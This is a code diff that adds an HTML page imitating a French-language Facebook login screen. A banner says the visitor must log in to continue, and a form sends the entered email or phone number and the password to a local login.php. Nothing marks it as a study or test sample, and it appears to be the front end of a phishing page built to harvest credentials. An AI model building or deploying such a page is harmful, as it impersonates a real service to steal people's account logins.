@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook – Se connecter</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #3b5998;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .header a {
+            background-color: green;
+            color: white;
+            text-decoration: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+        }
+        .message {
+            background-color: #fffbe6;
+            border: 1px solid #ffe582;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            background-color: #3b5998;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #314d80;
+        }
+        .link {
+            display: block;
+            margin-top: 10px;
+            color: #3b5998;
+            text-decoration: none;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        .create-account {
+            background-color: green;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>facebook</h1>
+    <a href="#">Inscription</a>
+</div>
+
+<div class="container">
+    <div class="message">
+        Vous devez vous connecter pour continuer.
+    </div>
+    <h2>Se connecter à Facebook</h2>
+    <form method="post" action="login.php">
+        <input type="text" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required />
+        <input type="password" name="password" placeholder="Mot de passe" required />
+        <button type="submit">Connexion</button>
+        <hr style="margin: 15px 0;">
+        <a href="#" class="link">ou</a>
+        <button class="create-account">Créer un compte</button>
+        <p><a href="#" class="link">Informations de compte oubliées ?</a></p>
+    </form>
+</div>
+
+</body>
+</html>
